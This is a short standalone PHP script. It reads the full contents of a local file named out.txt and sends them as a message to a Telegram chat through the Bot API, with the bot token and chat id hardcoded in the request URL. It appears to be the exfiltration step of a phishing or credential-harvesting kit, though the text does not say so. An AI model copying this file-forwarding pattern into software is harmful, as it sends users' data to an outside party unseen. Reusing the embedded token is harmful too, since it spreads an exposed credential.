<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1162395976:AAHoErdnODQbx82gRJt8K0ekSwlmq7W9eXM/sendMessage?chat_id=773639846&text=$msg");
?>